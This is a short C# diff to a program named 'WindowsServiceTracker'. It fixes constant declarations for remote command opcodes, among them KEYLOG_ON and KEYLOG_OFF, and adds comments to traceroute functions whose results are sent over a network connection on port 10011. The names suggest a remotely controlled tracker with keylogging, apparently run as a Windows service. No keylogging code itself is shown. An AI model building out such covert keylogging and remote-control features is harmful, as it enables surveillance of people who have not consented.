@@ -27,9 +27,9 @@ namespace WindowsServiceTracker
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
-        public static const byte KEYLOG_ON = 0;
-        public static const byte KEYLOG_OFF = 1;
-        public static const byte TRACE_ROUTE = 2;
+        public const byte KEYLOG_ON = 0;
+        public const byte KEYLOG_OFF = 1;
+        public const byte TRACE_ROUTE = 2;
         private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
@@ -328,6 +328,9 @@ namespace WindowsServiceTracker
             return false;
         }
 
+        /* Performs a trace route and sends it over the current connection
+         * in the form <opcode>IP~IP~IP~...newline
+         */
         private bool sendTraceRouteInfo()
         {
             String ipString = traceRoute(ipAddressString);
@@ -340,6 +343,9 @@ namespace WindowsServiceTracker
             return false;
         }
 
+        /* Performs a traceroute to the given address. Returns a string of
+         * IP addresses delimited by '~'
+         */
         private String traceRoute(String address)
         {
             String ipString = String.Empty;
